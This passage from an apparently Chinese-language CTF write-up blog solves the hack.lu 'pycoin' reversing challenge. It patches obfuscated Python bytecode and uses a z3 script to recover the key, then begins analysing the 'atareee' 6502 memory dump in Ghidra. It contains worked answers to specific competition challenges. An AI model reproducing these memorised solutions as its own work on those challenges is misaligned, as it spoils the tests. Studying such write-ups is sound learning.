    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (f &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# f812f706f306ff02ff0dfde207&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;hacklupycoin&#34;&gt;[hack.lu]pycoin&lt;/h2&gt;
&lt;p&gt;先使用uncompyle6反编译，发现执行了一串marshal字节码&lt;/p&gt;
&lt;p&gt;将该字节码输出到文件，然后根据题目给的pyc补全文件头&lt;/p&gt;
&lt;p&gt;再次反编译发现有花指令，开头和中间各有一个 jump_forward，中间还有两个连续的 rot_tow&lt;/p&gt;
&lt;p&gt;这里尝试了一下新的patch方法：将花指令全替换成nop，但该方法的问题在于只能使用pycdc进行反编译，并不支持uncompyle6&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;个人感觉uncompyle6反编译效果更好，但适用的版本范围更窄，3.7及之前的版本较为合适
pycdc一直更新最新版本，但反编译效果较差，而且在细节上容易出问题，新版本只能使用pycdc，但最好结合pycdas的结果进行分析&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另一种传统的patch方法就行把opcode去掉，然后把所有jmp修改到正确位置&lt;/p&gt;
&lt;p&gt;patch后的结果如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 106; 
			flex-basis: 255px&#34;
	&gt;
	&lt;a href=&#34;/post/resent-re-challenge/pycoin-1.png&#34; data-size=&#34;742x697&#34;&gt;
		&lt;img src=&#34;/post/resent-re-challenge/pycoin-1.png&#34;
			width=&#34;742&#34;
			height=&#34;697&#34;
			srcset=&#34;/post/resent-re-challenge/pycoin-1_hu4561739223183a72fcda80c25f694b2c_102405_480x0_resize_box_3.png 480w, /post/resent-re-challenge/pycoin-1_hu4561739223183a72fcda80c25f694b2c_102405_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 102; 
			flex-basis: 244px&#34;
	&gt;
	&lt;a href=&#34;/post/resent-re-challenge/pycoin-2.png&#34; data-size=&#34;742x727&#34;&gt;
		&lt;img src=&#34;/post/resent-re-challenge/pycoin-2.png&#34;
			width=&#34;742&#34;
			height=&#34;727&#34;
			srcset=&#34;/post/resent-re-challenge/pycoin-2_hu51d65f0a1c25727015c554b4e57cab00_104454_480x0_resize_box_3.png 480w, /post/resent-re-challenge/pycoin-2_hu51d65f0a1c25727015c554b4e57cab00_104454_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后反编译的结果为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; hashlib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; md5
k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;please supply a valid key:&amp;#39;&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
correct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(k) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sum(k) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1322&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;260&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; int(chr(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; md5(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (k[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;valid key! &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;k&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; correct &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;invalid key :(&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后一个z3就完事（tm k[5]约束了个寂寞）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;k&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)]

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sum(k) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1322&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;260&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((k[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (k[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(k[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (k[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check():
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;# 这个位置根本没有约束，最后官方直接给出来了&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
        print (chr(model[k[i]]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;hackluatareee&#34;&gt;[hack.lu]atareee&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;atareee.atstate2&lt;/code&gt; 是内存状态，对其进行binwalk，可以得到 &lt;code&gt;memory.bin&lt;/code&gt; 和 &lt;code&gt;savestate.json&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;根据分析可以得知是 &lt;code&gt;6052&lt;/code&gt; 架构，用Ghidra打开，根据题目中提示的 &lt;code&gt;@061A&lt;/code&gt; 找到验证逻辑的地址&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;/atareee1.png&#34; &gt;
		&lt;img src=&#34;/atareee1.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;加密函数和验证函数如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FUN_529e&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte in_C;
  
  bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    write_1(PORTA,bVar3);
    bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_1(PORTA);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_50c2[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; BYTE_ARRAY_50c2[(byte)(bVar3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)];
      bVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_1(PORTA);
      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_5234[bVar3];
      bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BYTE_ARRAY_5234[bVar3];
      BYTE_ARRAY_5234[bVar3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bVar1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CARRY1(bVar2,BYTE_ARRAY_50c2[bVar3]);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
